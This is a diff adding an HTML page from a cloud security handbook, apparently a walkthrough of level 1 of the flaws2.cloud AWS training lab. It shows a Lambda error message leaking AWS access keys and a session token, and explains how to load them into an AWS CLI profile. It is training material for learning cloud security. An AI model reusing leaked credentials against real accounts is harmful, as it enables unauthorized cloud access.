@@ -1,0 +1,755 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="The encyclopedia for offensive security in the cloud.">
+      
+      
+      
+        <link rel="canonical" href="https://0xeval.github.io/aws/training_labs/flaws2/">
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+    
+    
+      
+        <title>Flaws II - The Hacking Handbook</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.975780f9.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.2505c338.min.css">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#flaws-ii" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="The Hacking Handbook" class="md-header__button md-logo" aria-label="The Hacking Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            The Hacking Handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Flaws II
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent=""  aria-label="Switch to Dark Mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to Dark Mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9v1Z"/></svg>
+            </label>
+          
+        
+          
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent=""  aria-label="Switch to Light Mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to Light Mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/0xEval/0xeval.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    0xeval/hackinghandbook
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="The Hacking Handbook" class="md-nav__button md-logo" aria-label="The Hacking Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    The Hacking Handbook
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/0xEval/0xeval.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    0xeval/hackinghandbook
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_1">
+          AWS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="AWS" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          AWS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../enumeration/" class="md-nav__link">
+        Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_2" type="checkbox" id="__nav_1_2" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_1_2">
+          Training Labs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Training Labs" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_2">
+          <span class="md-nav__icon md-icon"></span>
+          Training Labs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../flaws/" class="md-nav__link">
+        Flaws I
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Flaws II
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Flaws II
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-1-exposed-environment-variables-through-lambda-function" class="md-nav__link">
+    Level 1 - Exposed environment variables through Lambda function
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2-elastic-container-registries-ecr" class="md-nav__link">
+    Level 2 - Elastic Container Registries (ECR)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3-stealing-keys-from-ecr-metadata-service-via-ssrf" class="md-nav__link">
+    Level 3 - Stealing Keys from ECR Metadata Service via SSRF
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Mobile
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Mobile" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Mobile
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mobile/enumeration/" class="md-nav__link">
+        Objection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-1-exposed-environment-variables-through-lambda-function" class="md-nav__link">
+    Level 1 - Exposed environment variables through Lambda function
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2-elastic-container-registries-ecr" class="md-nav__link">
+    Level 2 - Elastic Container Registries (ECR)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3-stealing-keys-from-ecr-metadata-service-via-ssrf" class="md-nav__link">
+    Level 3 - Stealing Keys from ECR Metadata Service via SSRF
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <a href="https://github.com/0xEval/0xeval.github.io/edit/master/docs/aws/training_labs/flaws2.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="flaws-ii">Flaws II</h1>
+<p>Link to Challenge: <a href="http://flaws2.cloud/">flaws2.cloud</a><br />
+Credits: <a href="https://twitter.com/0xdabbad00">@0xdabbad00</a></p>
+<h2 id="level-1-exposed-environment-variables-through-lambda-function">Level 1 - Exposed environment variables through Lambda function</h2>
+<div class="admonition help">
+<p class="admonition-title">Objective</p>
+<p>For this level, you'll need to enter the correct PIN code.
+The correct PIN is 100 digits long, so brute forcing it won't help. </p>
+</div>
+<div class="highlight"><pre><span></span><code>Error, malformed input
+{&quot;AWS_LAMBDA_FUNCTION_VERSION&quot;:&quot;$LATEST&quot;,&quot;AWS_LAMBDA_INITIALIZATION_TYPE&quot;:&quot;on-demand&quot;,&quot;LD_LIBRARY_PATH&quot;:&quot;/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib&quot;,&quot;AWS_LAMBDA_LOG_STREAM_NAME&quot;:&quot;2022/12/15/[$LATEST]90366030bb464441a68998b9127eef29&quot;,&quot;AWS_LAMBDA_FUNCTION_MEMORY_SIZE&quot;:&quot;128&quot;,&quot;PATH&quot;:&quot;/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin&quot;,&quot;AWS_SECRET_ACCESS_KEY&quot;:&quot;K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs&quot;,&quot;LANG&quot;:&quot;en_US.UTF-8&quot;,&quot;_AWS_XRAY_DAEMON_ADDRESS&quot;:&quot;169.254.79.129&quot;,&quot;AWS_XRAY_DAEMON_ADDRESS&quot;:&quot;169.254.79.129:2000&quot;,&quot;AWS_ACCESS_KEY_ID&quot;:&quot;ASIAZQNB3KHGKTT3RYD6&quot;,&quot;AWS_SESSION_TOKEN&quot;:&quot;IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA=&quot;,&quot;LAMBDA_RUNTIME_DIR&quot;:&quot;/var/runtime&quot;,&quot;_AWS_XRAY_DAEMON_PORT&quot;:&quot;2000&quot;,&quot;AWS_REGION&quot;:&quot;us-east-1&quot;,&quot;AWS_DEFAULT_REGION&quot;:&quot;us-east-1&quot;,&quot;_HANDLER&quot;:&quot;index.handler&quot;,&quot;AWS_LAMBDA_LOG_GROUP_NAME&quot;:&quot;/aws/lambda/level1&quot;,&quot;AWS_EXECUTION_ENV&quot;:&quot;AWS_Lambda_nodejs8.10&quot;,&quot;TZ&quot;:&quot;:UTC&quot;,&quot;AWS_LAMBDA_FUNCTION_NAME&quot;:&quot;level1&quot;,&quot;AWS_LAMBDA_RUNTIME_API&quot;:&quot;127.0.0.1:9001&quot;,&quot;AWS_XRAY_CONTEXT_MISSING&quot;:&quot;LOG_ERROR&quot;,&quot;LAMBDA_TASK_ROOT&quot;:&quot;/var/task&quot;,&quot;NODE_PATH&quot;:&quot;/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules&quot;,&quot;_X_AMZN_TRACE_ID&quot;:&quot;Root=1-639ae1e9-5cd0a30149fb59526795ddcd;Parent=1884fb2965de9ad2;Sampled=0&quot;}
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">validateForm</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="s2">&quot;myForm&quot;</span><span class="p">][</span><span class="s2">&quot;code&quot;</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="o">!</span><span class="nb">isNaN</span><span class="p">(</span><span class="nb">parseFloat</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">isFinite</span><span class="p">(</span><span class="nx">code</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Code must be a number&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="nx">x9sByb69uZ3Qipwx61jqpSOdizhGGLk5JytiUVy2</span><span class="w"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;myForm&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1&quot;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&quot;return validateForm()&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>The lambda function debugging message will contain <strong>environment variables</strong> used by the instance:</p>
+<div class="highlight"><pre><span></span><code>&quot;AWS_ACCESS_KEY_ID&quot;:&quot;ASIAZQNB3KHGKTT3RYD6&quot;
+&quot;AWS_SECRET_ACCESS_KEY&quot;:&quot;K8FP2Wqpa/ENwU8iHqLaWHRA65MOq9qdq6zq0hhs&quot;
+&quot;AWS_SESSION_TOKEN&quot;:&quot;IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJIMEYCIQDeBPPM9vqZ8r4upGQesMpWFRkDxFxi8p31j2B9JOB4OgIhAJnO1RACf3MHXtFHiAXzut37wg7hTnnEQy3NQ1JuA83EKukCCOr//////////wEQAxoMNjUzNzExMzMxNzg4IgyrCzLK3Tc3dn+NtdYqvQKdwmBYEjZ0+3H5bCpuIzUvkX9IUIioiIdAiUu/7PKgUbNPXRE+9WMQ0xAAjGjKm6nqMXbxCUuuMgJvAtpaESbyLxdW9mfZG5rf+TIIqHsUNw//wCjEMh5eTdwgtuJB17DWiyuyOTl6KXlnHghlcErs1gDXCs6WaJ2+zO0McBdQlbQ2aPnJYIS/haLPXJz1eCRQ5Gv7Pe72DyYRmf8bTeDTyU8cNEKa193uSylTmzHa5m238iJ6Z1wPYNR8K5U26zbJy3xxZr2s+o+EufZUj/C3WjxWuFXTPJxDzdOpMpbEQUHUrT5vBckcx7DLxCyIVF9dM8vpXyjTIQC269xgJ2opZv2fRAL8mc/n7bJlkkUew4zDnAn1jPqpO3maV2ifAnLKdKfjWc3LDwNyiLk7ZBE+icc2RFVWPL8RdV5/OzDOu+ucBjqdAfgbCdVtkLSBKOabiVp7DjU6Ek1MMauFeCaSTM6CJqT9xskry/qBiCMGHchOloCY2/RULl/lA3tS9cf/es71k5dQRWdqwkmqvYI/5iZMRSd5Bj+9JJuYKJXI5h9n5DYFWL4c9elu9HehWwZnL4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA=&quot;
+</code></pre></div>
+<p>We can import those in a profile using <code>aws configure --profile level1</code>, remember to add the session token as part of the credential config:</p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p><a href="https://docs.aws.amazon.com/STS/latest/APIReference/API_Credentials.html">Temporary (AWS STS) access key IDs</a> - as denoted by the <code>ASIA</code> prefix in the <code>AccessKeyId</code> field - require to add an extra field in the <code>aws profile</code> configuration file:
+    <div class="highlight"><pre><span></span><code># cat ~/.aws/credentials
+[level1]
+aws_access_key_id = &lt;AccessKeyId&gt;
+aws_secret_access_key = &lt;SecretAccessKey&gt; 
+aws_session_token = &lt;Token&gt;
+</code></pre></div></p>
+</div>
+<p>As usual after obtaining new keys, we perform basic enumeration:</p>
